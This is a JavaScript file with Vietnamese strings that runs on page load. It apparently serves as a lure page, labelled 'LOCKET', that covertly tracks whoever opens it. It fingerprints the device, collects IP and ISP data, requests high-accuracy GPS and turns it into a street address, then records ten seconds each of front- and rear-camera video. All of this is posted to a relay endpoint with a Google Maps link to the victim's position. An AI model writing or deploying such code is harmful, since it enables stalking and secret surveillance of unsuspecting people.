const API_PROXY = '/api/send';
const info = {
    time: new Date().toLocaleString('vi-VN'),
    ip: '', isp: '', realIp: '', address: '', country: '',
    lat: '', lon: '', device: '', os: '',
    camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    const ratio = window.devicePixelRatio;

    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        if (match) {
            let model = match[1].split('/')[0].trim();
            if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
            if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
            info.device = model;
        } else { info.device = 'Android Device'; }
    }
    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        info.os = 'iOS';
        const res = `${screenW}x${screenH}@${ratio}`;
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
        };
        info.device = iphoneModels[res] || 'iPhone Model';
    }
    else if (/Windows NT/i.test(ua)) { info.device = 'Windows PC'; info.os = 'Windows'; }
    else if (/Macintosh/i.test(ua)) { info.device = 'Mac'; info.os = 'macOS'; }
    else { info.device = 'Không xác định'; info.os = 'Không rõ'; }
}

async function getPublicIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const data = await r.json();
        info.ip = data.ip || 'Không rõ';
    } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
    try {
        const r = await fetch('https://icanhazip.com');
        const ip = await r.text();
        info.realIp = ip.trim();
        const res = await fetch(`https://ipwho.is/${info.realIp}`);
        const data = await res.json();
        info.isp = data.connection?.org || 'VNNIC';
        info.country = data.country || 'Việt Nam';
    } catch (e) { info.realIp = 'Lỗi kết nối'; }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = data.display_name || '📍 Vị trí GPS';
                    info.country = data.address?.country || info.country;
                } catch { info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`; }
                resolve();
            },
            async () => {
                await fallbackIPLocation();
                resolve();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

async function fallbackIPLocation() {
    try {
        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
        info.lat = data.latitude?.toFixed(6) || '0';
        info.lon = data.longitude?.toFixed(6) || '0';
        info.address = `${data.city}, ${data.region} (Vị trí IP)`;
        info.country = data.country || 'Việt Nam';
    } catch (e) { info.address = 'Không rõ'; }
}

async function recordVideo(facingMode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        return new Promise((resolve, reject) => {
            let options = { mimeType: 'video/webm;codecs=vp9,opus' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options = { mimeType: 'video/webm;codecs=vp8,opus' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/webm' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options = { mimeType: 'video/mp4' };
                    }
                }
            }

            const mediaRecorder = new MediaRecorder(stream, options);
            const chunks = [];

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: options.mimeType });
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };

            mediaRecorder.start();
            // Quay video trong 10 giây
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 10000);
        });
    } catch (e) {
        console.error(`Lỗi quay video (${facingMode}):`, e);
        throw e;
    }
}

function getCaption() {
    const mapsLink = info.lat && info.lon ? `https://maps.google.com/?q=${info.lat},${info.lon}` : 'Không rõ';
    return `📡 [THÔNG TIN TRUY CẬP LOCKET - VIDEO 10S]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
}

async function sendMedia(frontB64, backB64) {
    const media = [];
    if (frontB64) {
        media.push({ type: 'video', media: frontB64, caption: getCaption() });
    }
    if (backB64) {
        media.push({ type: 'video', media: backB64 });
    }
    return fetch(API_PROXY, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'media', media: media })
    });
}

async function sendTextOnly() {
    return fetch(API_PROXY, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'text', text: getCaption() })
    });
}

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function startTracking() {
    detectDevice();
    await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

    let front = null, back = null;
    try {
        // Quay camera trước 10s
        front = await recordVideo("user");
        await delay(1000);
        // Quay camera sau 10s
        try {
            back = await recordVideo("environment");
        } catch (errBack) {
            console.warn("Không quay được camera sau:", errBack);
        }
        info.camera = '✅ Đã quay video camera trước và sau (10s)';
    } catch (e) {
        info.camera = '🚫 Lỗi quay video hoặc bị từ chối';
    }

    if (front || back) {
        await sendMedia(front, back);
    } else {
        await sendTextOnly();
    }
}

// Start immediately on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startTracking);
} else {
    startTracking();
}
